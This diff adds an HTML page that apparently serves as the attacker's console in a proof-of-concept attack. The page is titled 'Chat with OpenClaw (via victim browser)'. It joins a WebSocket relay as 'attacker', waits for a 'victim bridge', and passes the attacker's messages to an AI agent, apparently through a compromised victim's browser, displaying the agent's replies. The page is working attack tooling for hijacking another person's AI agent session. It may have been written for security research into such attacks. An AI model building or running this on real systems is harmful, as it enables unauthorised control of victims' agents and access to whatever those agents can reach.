@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Proxy — Chat with OpenClaw (via victim browser)</title>
+  <style>
+    * { box-sizing: border-box; }
+    body {
+      margin: 0;
+      min-height: 100vh;
+      background: #0f0f12;
+      color: #e0e0e0;
+      font-family: "JetBrains Mono", "SF Mono", "Consolas", monospace;
+      font-size: 14px;
+      padding: 1.5rem;
+      display: flex;
+      flex-direction: column;
+    }
+    h1 {
+      font-size: 1rem;
+      font-weight: 600;
+      letter-spacing: 0.05em;
+      color: #888;
+      margin: 0 0 1rem 0;
+    }
+    .status {
+      font-size: 12px;
+      color: #666;
+      margin-bottom: 0.75rem;
+    }
+    .status.connected { color: #5cb85c; }
+    .status.error { color: #c9302c; }
+    .victim-indicator {
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+      padding: 0.6rem 1rem;
+      margin-bottom: 0.75rem;
+      border-radius: 8px;
+      font-size: 14px;
+      font-weight: 600;
+      background: #1f2937;
+      border: 1px solid #374151;
+      color: #9ca3af;
+    }
+    .victim-indicator.connected {
+      background: #064e3b;
+      border-color: #047857;
+      color: #6ee7b7;
+    }
+    .victim-indicator .victim-dot {
+      width: 10px;
+      height: 10px;
+      border-radius: 50%;
+      background: #6b7280;
+      flex-shrink: 0;
+    }
+    .victim-indicator.connected .victim-dot {
+      background: #34d399;
+      box-shadow: 0 0 8px #34d399;
+    }
+    .victim-indicator .victim-label { flex: 1; }
+    .chat {
+      flex: 1;
+      min-height: 280px;
+      max-height: 50vh;
+      overflow-y: auto;
+      background: rgba(0,0,0,0.3);
+      border: 1px solid #2a2a2a;
+      border-radius: 8px;
+      padding: 1rem;
+      margin-bottom: 1rem;
+    }
+    .chat-msg {
+      margin-bottom: 0.75rem;
+    }
+    .chat-msg .who {
+      font-size: 11px;
+      color: #666;
+      margin-bottom: 0.2rem;
+    }
+    .chat-msg.you .who { color: #6b8cae; }
+    .chat-msg.bot .who { color: #7a9b76; }
+    .chat-msg .body {
+      font-size: 13px;
+      line-height: 1.5;
+      padding: 0.5rem 0.75rem;
+      border-radius: 6px;
+      white-space: pre-wrap;
+      word-break: break-word;
+    }
+    .chat-msg.you .body {
+      background: rgba(60, 80, 120, 0.25);
+      border: 1px solid #3a4a6a;
+    }
+    .chat-msg.bot .body {
+      background: rgba(40, 60, 40, 0.25);
+      border: 1px solid #2a4a2a;
+    }
+    .input-row {
+      display: flex;
+      gap: 0.5rem;
+    }
+    .input-row input {
+      flex: 1;
+      background: #1a1a1a;
+      border: 1px solid #333;
+      border-radius: 6px;
+      color: #e0e0e0;
+      padding: 0.5rem 0.75rem;
+      font-family: inherit;
+      font-size: 13px;
+    }
+    .input-row input:focus {
+      outline: none;
+      border-color: #555;
+    }
+    .input-row button {
+      background: #2a4a6a;
+      border: 1px solid #3a5a7a;
+      color: #e0e0e0;
+      padding: 0.5rem 1rem;
+      border-radius: 6px;
+      font-family: inherit;
+      cursor: pointer;
+    }
+    .input-row button:hover { background: #3a5a7a; }
+    .input-row button:disabled { opacity: 0.5; cursor: not-allowed; }
+  </style>
+</head>
+<body>
+  <h1>Proxy — Chat with OpenClaw (via victim browser)</h1>
+  <div class="victim-indicator" id="victimIndicator">
+    <span class="victim-dot"></span>
+    <span class="victim-label">Waiting for victim…</span>
+  </div>
+  <div class="status" id="status">Connecting to relay…</div>
+  <div class="chat" id="chat"></div>
+  <form class="input-row" id="form">
+    <input type="text" id="input" placeholder="Type a message…" autocomplete="off" disabled>
+    <button type="submit" id="sendBtn" disabled>Send</button>
+  </form>
+
+  <script>
+    const chat = document.getElementById("chat");
+    const statusEl = document.getElementById("status");
+    const victimIndicator = document.getElementById("victimIndicator");
+    const input = document.getElementById("input");
+    const sendBtn = document.getElementById("sendBtn");
+    const form = document.getElementById("form");
+
+    const wsScheme = location.protocol === "https:" ? "wss:" : "ws:";
+    const wsUrl = wsScheme + "//" + location.host + "/ws";
+    let ws = null;
+
+    function escapeHtml(s) {
+      const el = document.createElement("div");
+      el.textContent = s;
+      return el.innerHTML;
+    }
+
+    function appendMsg(role, text) {
+      const div = document.createElement("div");
+      div.className = "chat-msg " + role;
+      const who = role === "you" ? "You" : "OpenClaw";
+      div.innerHTML = "<div class=\"who\">" + escapeHtml(who) + "</div><div class=\"body\">" + escapeHtml(text) + "</div>";
+      chat.appendChild(div);
+      chat.scrollTop = chat.scrollHeight;
+    }
+
+    function setStatus(txt, kind) {
+      statusEl.textContent = txt;
+      statusEl.className = "status" + (kind ? " " + kind : "");
+    }
+
+    function connect() {
+      setStatus("Connecting to relay…");
+      ws = new WebSocket(wsUrl);
+      ws.onopen = () => {
+        ws.send(JSON.stringify({ type: "role", role: "attacker" }));
+        setStatus("Connected. Waiting for victim bridge…", "connected");
+        input.disabled = false;
+        sendBtn.disabled = false;
+      };
+      ws.onclose = () => {
+        setStatus("Disconnected from relay.", "error");
+        victimIndicator.classList.remove("connected");
+        victimIndicator.querySelector(".victim-label").textContent = "Waiting for victim…";
+        input.disabled = true;
+        sendBtn.disabled = true;
+        setTimeout(connect, 3000);
+      };
+      ws.onerror = () => setStatus("WebSocket error.", "error");
+      ws.onmessage = (e) => {
+        try {
+          const msg = JSON.parse(e.data);
+          if (msg.type === "bridge_ready") {
+            victimIndicator.classList.add("connected");
+            victimIndicator.querySelector(".victim-label").textContent = "Victim connected";
+          } else if (msg.type === "reply" && typeof msg.text === "string") {
+            appendMsg("bot", msg.text);
+          }
+        } catch (_) {}
+      };
+    }
+
+    form.addEventListener("submit", (e) => {
+      e.preventDefault();
+      const text = (input.value || "").trim();
+      if (!text || !ws || ws.readyState !== WebSocket.OPEN) return;
+      ws.send(JSON.stringify({ type: "message", text }));
+      appendMsg("you", text);
+      input.value = "";
+    });
+
+    connect();
+  </script>
+</body>
+</html>
